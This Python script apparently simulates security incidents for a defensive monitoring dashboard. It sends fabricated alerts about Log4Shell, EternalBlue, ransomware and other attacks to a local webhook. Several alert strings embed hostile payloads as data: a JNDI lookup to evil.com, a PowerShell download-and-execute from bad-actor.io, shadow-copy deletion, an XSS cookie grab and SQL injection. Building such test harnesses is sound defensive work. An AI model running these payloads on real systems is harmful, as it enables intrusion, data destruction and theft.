import requests
import json
import time
import random
from datetime import datetime, timezone, timedelta

WEBHOOK_URL = "http://127.0.0.1:5000/webhook"

# High-Value Assets (Org Context)
assets = [
    {"name": "PRIMARY-DC-01", "ip": "10.0.1.10", "role": "Domain Controller", "os": "Windows Server 2022"},
    {"name": "SQL-PROD-CLUSTER", "ip": "10.0.5.50", "role": "Production Database", "os": "Ubuntu 22.04 LTS"},
    {"name": "CEO-MACBOOK-PRO", "ip": "192.168.10.15", "role": "Executive Endpoint", "os": "macOS Sonoma"},
    {"name": "SWIFT-PAYMENT-GW", "ip": "10.50.1.100", "role": "Financial Gateway", "os": "RHEL 9"},
    {"name": "EDGE-FIREWALL-01", "ip": "10.0.1.1", "role": "Palo Alto Next-Gen FW", "os": "PAN-OS"}
]

# Attack Scenarios (Kill-Chain focused)
scenarios = [
    # 1. LOG4SHELL (Exploit)
    {
        "type": "Exploit: Log4Shell (CVE-2021-44228)",
        "tech_id": "T1190",
        "tactic": "Initial Access",
        "events": [
            {"desc": "Log4j JNDI Exploit Attempt", "level": 15, "log": "Inbound request from 185.12.3.4 contains '${jndi:ldap://evil.com/x}' in User-Agent header targeting SQL-PROD-CLUSTER."}
        ]
    },
    # 2. ETERNALBLUE (SMB)
    {
        "type": "Exploit: EternalBlue (CVE-2017-0144)",
        "tech_id": "T1210",
        "tactic": "Lateral Movement",
        "events": [
            {"desc": "SMBv1 MS17-010 Detected", "level": 15, "log": "Malformed SMBv1 transaction request from WS-102 to PRIMARY-DC-01. Pattern matches DoublePulsar backdoor delivery."}
        ]
    },
    # 3. PROXYLOGON (Exchange)
    {
        "type": "Exploit: ProxyLogon (CVE-2021-26855)",
        "tech_id": "T1190",
        "tactic": "Initial Access",
        "events": [
            {"desc": "Exchange SSRF Attempt", "level": 14, "log": "Unauthorized access to /owa/auth/Current/themes/resources/logon.aspx on MAIL-SVR-01 from 45.67.2.1."}
        ]
    },
    # 4. BLUEKEEP (RDP)
    {
        "type": "Exploit: BlueKeep (CVE-2019-0708)",
        "tech_id": "T1210",
        "tactic": "Lateral Movement",
        "events": [
            {"desc": "RDP Vulnerability Attempt", "level": 15, "log": "RDP request with specific malformed packet on port 3389 targeting FINANCE-SRV. Potential CVE-2019-0708 exploit."}
        ]
    },
    # 5. PRINTNIGHTMARE
    {
        "type": "Exploit: PrintNightmare (CVE-2021-34527)",
        "tech_id": "T1068",
        "tactic": "Privilege Escalation",
        "events": [
            {"desc": "Spooler Privilege Escalation", "level": 14, "log": "Malicious driver loaded into Print Spooler service on PRIMARY-DC-01. Path: C:\\Windows\\System32\\spool\\drivers\\x64\\3\\bad.dll"}
        ]
    },
    # 6. SQL INJECTION (Generic)
    {
        "type": "Web Attack: SQL Injection",
        "tech_id": "T1190",
        "tactic": "Initial Access",
        "events": [
            {"desc": "Blind SQLi Detected", "level": 9, "log": "HTTP POST to /api/login contains 'OR 1=1' in password field targeting CUSTOMER-PORTAL."}
        ]
    },
    # 7. XSS (Generic)
    {
        "type": "Web Attack: Stored XSS",
        "tech_id": "T1566",
        "tactic": "Initial Access",
        "events": [
            {"desc": "Stored XSS in Comment", "level": 7, "log": "Input containing <script>alert(document.cookie)</script> submitted to blog comments section."}
        ]
    },
    # 8. BRUTE FORCE
    {
        "type": "Access: Brute Force",
        "tech_id": "T1110",
        "tactic": "Credential Access",
        "events": [
            {"desc": "SSH Brute Force", "level": 6, "log": "Failed SSH login for user 'root' from 103.45.67.89 on Linux-App-01. 150 attempts in 3 minutes."}
        ]
    },
    # 9. GOLDEN TICKET
    {
        "type": "APT: Golden Ticket",
        "tech_id": "T1558.001",
        "tactic": "Credential Access",
        "events": [
            {"desc": "Forged Kerberos TGT", "level": 15, "log": "Kerberos ticket detected with expiration date 10 years in the future for user 'DomainAdmin' on PRIMARY-DC-01."}
        ]
    },
    # 10. PASS THE HASH
    {
        "type": "Lateral: Pass-the-Hash",
        "tech_id": "T1550.002",
        "tactic": "Lateral Movement",
        "events": [
            {"desc": "NTLM Hash Usage", "level": 12, "log": "Authenticating using NTLM hash (no cleartext password) for user 'svc_backup' on BACKUP-SRV."}
        ]
    },
    # 11. MIMIKATZ DETECTION
    {
        "type": "Malware: Mimikatz",
        "tech_id": "T1003.001",
        "tactic": "Credential Access",
        "events": [
            {"desc": "LSASS Memory Dump", "level": 14, "log": "lsass.exe memory dumped to C:\\temp\\lsass.dmp by unknown process PID 5674. Mimikatz pattern."}
        ]
    },
    # 12. DATA EXFILTRATION
    {
        "type": "Exfiltration: DNS Tunneling",
        "tech_id": "T1048.003",
        "tactic": "Exfiltration",
        "events": [
            {"desc": "Large DNS Traffic", "level": 11, "log": "Unusual volume of DNS TXT records (5GB) to domain 'x-data-site.ru' from HR-LPT-44."}
        ]
    },
    # 13. RANSOMWARE (LockBit)
    {
        "type": "Impact: LockBit Ransomware",
        "tech_id": "T1486",
        "tactic": "Impact",
        "events": [
            {"desc": "Rapid File Encryption", "level": 15, "log": "Mass file renaming detected on SHARED-DRIVE-01. Extension .lockbit applied to 450,000 files in 10 minutes."}
        ]
    },
    # 14. PRIVILEGE ESCALATION (DirtyCow)
    {
        "type": "Exploit: DirtyCow (CVE-2016-5195)",
        "tech_id": "T1068",
        "tactic": "Privilege Escalation",
        "events": [
            {"desc": "Linux Kernel Exploit", "level": 13, "log": "Race condition exploit targeting copy-on-write (COW) mechanism on Web-Server-Linux."}
        ]
    },
    # 15. PORT SCANNING
    {
        "type": "Recon: Nmap Scan",
        "tech_id": "T1595.001",
        "tactic": "Reconnaissance",
        "events": [
            {"desc": "Aggressive Port Scan", "level": 5, "log": "Syn scan detected on 1000 ports from 192.168.1.100. Target: INTERNAL-VLAN."}
        ]
    },
    # 16. ZERO-LOGON
    {
        "type": "Exploit: ZeroLogon (CVE-2020-1472)",
        "tech_id": "T1210",
        "tactic": "Privilege Escalation",
        "events": [
            {"desc": "Netlogon Spoofing", "level": 15, "log": "Successful spoofing of Netlogon server connection on PRIMARY-DC-01. Bypassing authentication for machine account."}
        ]
    },
    # 17. SPRING4SHELL
    {
        "type": "Exploit: Spring4Shell (CVE-2022-22965)",
        "tech_id": "T1190",
        "tactic": "Initial Access",
        "events": [
            {"desc": "Spring Framework RCE", "level": 14, "log": "Malicious class object manipulation request on /api/items. Targeting Spring Core vulnerability."}
        ]
    },
    # 18. SOLARWINDS SUPPLY CHAIN
    {
        "type": "APT: Sunburst Backdoor",
        "tech_id": "T1195.002",
        "tactic": "Initial Access",
        "events": [
            {"desc": "Supply Chain Malware", "level": 15, "log": "SolarWinds.Orion.Core.BusinessLayer.dll found with malicious code signature. Beaconing to avsvmcloud.com."}
        ]
    },
    # 19. REVERSE SHELL
    {
        "type": "Execution: Reverse Shell",
        "tech_id": "T1059.004",
        "tactic": "Execution",
        "events": [
            {"desc": "Python Reverse Shell", "level": 13, "log": "Active connection from linux-srv-01 to 66.77.88.99:4444 executing /bin/bash."}
        ]
    },
    # 20. DATA WIPER (NotPetya)
    {
        "type": "Impact: NotPetya Wiper",
        "tech_id": "T1485",
        "tactic": "Impact",
        "events": [
            {"desc": "MBR Destruction", "level": 15, "log": "Master Boot Record (MBR) overwritten on HR-WS-09. System non-bootable. Wiper pattern detected."}
        ]
    },
    {
        "type": "Ransomware: LockBit 3.0",
        "tech_id": "T1486",
        "tactic": "Data Encrypted for Impact",
        "events": [
            {"desc": "Suspicious PowerShell Download", "level": 9, "log": "IEX (New-Object Net.WebClient).DownloadString('http://bad-actor.io/payload.ps1') detected."},
            {"desc": "Shadow Copy Deletion", "level": 12, "log": "vssadmin.exe delete shadows /all /quiet executed with elevated privileges."},
            {"desc": "Ransomware Encryption Started", "level": 15, "log": "Mass file rename to .lockbit extension on SQL-PROD-CLUSTER. High disk I/O detected."}
        ]
    },
    {
        "type": "Data Exfiltration: DNS Tunneling",
        "tech_id": "T1071.004",
        "tactic": "Application Layer Protocol: DNS",
        "events": [
            {"desc": "Anomalous DNS Traffic", "level": 8, "log": "High volume of TXT queries to c2-dns.attacker-site.com from CEO-MACBOOK-PRO."},
            {"desc": "Data Exfiltration via DNS", "level": 13, "log": "Total of 850MB encoded data transmitted via DNS queries over the last hour."}
        ]
    }
]

def get_timestamp():
    return datetime.now(timezone(timedelta(hours=5, minutes=30))).isoformat()

def run_sim():
    print("🚀 Starting BlueGuard Advanced Threat Simulation v2.0")
    print("-" * 50)
    
    for _ in range(20): # Run 20 cycles
        scenario = random.choice(scenarios)
        asset = random.choice(assets)
        
        print(f"\n[CAMPAIGN] {scenario['type']} targeting {asset['name']}")
        
        for event in scenario['events']:
            payload = {
                "rule": {
                    "description": f"{event['desc']} (MITRE: {scenario['tech_id']})",
                    "level": event['level']
                },
                "agent": {
                    "name": asset['name'],
                    "ip": asset['ip'],
                    "role": asset['role']
                },
                "full_log": f"Forensic Log: {event['log']} | Target Role: {asset['role']} | OS: {asset['os']}",
                "timestamp": get_timestamp(),
                "id": f"sim-{int(time.time())}-{random.randint(1000, 9999)}"
            }
            
            try:
                r = requests.post(WEBHOOK_URL, json=payload, timeout=5)
                status = "✅" if r.status_code == 200 else "❌"
                print(f"  {status} {event['desc']}")
            except:
                print("  ❌ Connection Error")
            
            time.sleep(1) # Wait between stages

if __name__ == "__main__":
    run_sim()
    print("\n✅ Simulation Complete. Check the Dashboard for Intelligence.")
